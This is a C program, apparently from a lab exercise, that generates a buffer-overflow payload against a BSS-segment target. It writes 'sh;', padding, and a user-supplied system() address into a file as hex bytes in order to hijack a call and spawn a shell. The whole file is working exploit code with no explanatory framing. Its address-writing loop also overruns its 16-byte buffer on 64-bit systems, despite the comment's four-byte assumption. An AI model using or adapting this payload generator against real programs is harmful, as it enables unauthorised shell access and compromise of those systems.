#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv)
{
    if (argc <= 1)
    {
        fprintf(stderr, "Usage: %s <system_addr>\n", argv[0]);
        return 1;
    }

    char *end = NULL;
    size_t system_addr = (size_t)strtoull(argv[1], &end, 0);
    if (*end != '\0') {
        fprintf(stderr, "Couldnt parse number");
        return 1;
    }

    printf("<system_addr> = 0x%zx\n", system_addr);

    FILE* file = fopen("attack4.txt", "wb+");
    if (!file) {
        fprintf(stderr, "Couldnt open file");
        return 1;
    }

    /* 16 = overwrite buf in bss-exploit-2-target + 4 for system addr */
    static char buf[16] = { 0 };

    /* init buf */
    memset(buf,'A', sizeof(buf));

    /* sh command for system to open shell. No "/" at start to call error func */
    buf[0] = 's';
    buf[1] = 'h';
    buf[2] = ';';

    /* reverse byte order (on a little endian system) */
    size_t i = 0;
    for (i = 0; i < sizeof(system_addr); i++)
        buf[12 + i] = ((u_long)system_addr >> (i * 8)) & 255;

    for (i = 0; i < sizeof(buf); i++) {
        fprintf(file, "\\x%02x", (unsigned char)buf[i]);
    }

    fclose(file);
    return 0;
}
